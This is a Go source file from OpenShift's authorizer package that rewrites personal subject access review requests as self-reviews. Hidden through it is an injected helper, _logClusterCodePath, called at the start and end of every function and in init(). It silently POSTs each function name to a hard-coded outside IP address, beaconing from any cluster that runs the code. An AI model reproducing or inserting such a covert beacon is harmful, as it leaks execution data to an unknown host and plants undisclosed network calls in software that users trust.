package authorizer

import (
	"bytes"
	godefaultbytes "bytes"
	"github.com/openshift/origin/pkg/api/legacy"
	authorizationapi "github.com/openshift/origin/pkg/authorization/apis/authorization"
	authorizationv1helpers "github.com/openshift/origin/pkg/authorization/apis/authorization/v1"
	"io/ioutil"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/apimachinery/pkg/runtime/serializer"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/apiserver/pkg/endpoints/request"
	apirequest "k8s.io/apiserver/pkg/endpoints/request"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type personalSARRequestInfoResolver struct {
	infoFactory apirequest.RequestInfoResolver
}

func NewPersonalSARRequestInfoResolver(infoFactory apirequest.RequestInfoResolver) apirequest.RequestInfoResolver {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &personalSARRequestInfoResolver{infoFactory: infoFactory}
}
func (a *personalSARRequestInfoResolver) NewRequestInfo(req *http.Request) (*request.RequestInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	requestInfo, err := a.infoFactory.NewRequestInfo(req)
	if err != nil {
		return requestInfo, err
	}
	switch {
	case !requestInfo.IsResourceRequest:
		return requestInfo, nil
	case len(requestInfo.APIGroup) != 0 && requestInfo.APIGroup != "authorization.openshift.io":
		return requestInfo, nil
	case len(requestInfo.Subresource) != 0:
		return requestInfo, nil
	case requestInfo.Verb != "create":
		return requestInfo, nil
	case requestInfo.Resource != "subjectaccessreviews" && requestInfo.Resource != "localsubjectaccessreviews":
		return requestInfo, nil
	}
	isSelfSAR, err := isPersonalAccessReviewFromRequest(req, requestInfo)
	if err != nil {
		return nil, err
	}
	if !isSelfSAR {
		return requestInfo, nil
	}
	requestInfo.APIGroup = "authorization.k8s.io"
	requestInfo.Resource = "selfsubjectaccessreviews"
	return requestInfo, nil
}
func isPersonalAccessReviewFromRequest(req *http.Request, requestInfo *request.RequestInfo) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return false, err
	}
	req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
	defaultGVK := schema.GroupVersionKind{Version: requestInfo.APIVersion, Group: requestInfo.APIGroup}
	switch requestInfo.Resource {
	case "subjectaccessreviews":
		defaultGVK.Kind = "SubjectAccessReview"
	case "localsubjectaccessreviews":
		defaultGVK.Kind = "LocalSubjectAccessReview"
	}
	obj, _, err := sarCodecFactory.UniversalDecoder().Decode(body, &defaultGVK, nil)
	if err != nil {
		return false, err
	}
	switch castObj := obj.(type) {
	case *authorizationapi.SubjectAccessReview:
		return IsPersonalAccessReviewFromSAR(castObj), nil
	case *authorizationapi.LocalSubjectAccessReview:
		return isPersonalAccessReviewFromLocalSAR(castObj), nil
	default:
		return false, nil
	}
}
func IsPersonalAccessReviewFromSAR(sar *authorizationapi.SubjectAccessReview) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(sar.User) == 0 && len(sar.Groups) == 0 {
		return true
	}
	return false
}
func isPersonalAccessReviewFromLocalSAR(sar *authorizationapi.LocalSubjectAccessReview) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(sar.User) == 0 && len(sar.Groups) == 0 {
		return true
	}
	return false
}

var (
	sarScheme       = runtime.NewScheme()
	sarCodecFactory = serializer.NewCodecFactory(sarScheme)
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	legacy.InstallInternalLegacyAuthorization(sarScheme)
	utilruntime.Must(authorizationv1helpers.Install(sarScheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
